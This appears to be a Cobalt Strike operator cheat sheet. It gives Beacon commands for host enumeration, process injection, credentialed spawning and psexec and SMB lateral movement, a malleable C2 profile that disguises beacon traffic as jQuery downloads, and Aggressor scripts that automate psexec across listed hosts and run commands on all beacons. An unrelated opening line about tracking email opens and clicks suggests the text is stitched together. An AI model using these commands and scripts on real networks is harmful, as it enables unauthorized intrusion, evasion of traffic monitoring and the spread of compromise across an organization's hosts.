# Track opens and clicks in the CS activity log

net sessions
# Or across subnet:
net loggedon \\{target_hostname}

inject {pid} x64 {listener_name}
# Or via spawn:
spawnas {domain}\\{user} {password} {listener_name}

# jquery-c2.4.4.profile (excerpt):
set sleeptime "45000";
set jitter "20";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
http-get {
  set uri "/jquery-3.3.1.slim.min.js";
  client {
    header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
  }
}

jump psexec {target} {listener_name}
# Or with credentials:
jump psexec_psh {target} {listener_name}

link {target_hostname}
# Or by pipe name:
link {target} {pipe_name}

# Automate lateral movement in Aggressor:
$bid = $2;
$targets = @("192.168.1.10", "192.168.1.20");
foreach $t ($targets) {
  bjump($bid, "psexec", $t, "https-main");
}

# Run command on all Windows x64 Beacons:
foreach $bid (beacons()) {
  if(barch($bid) eq "x64") {
    bshell($bid, "whoami");
  }
}
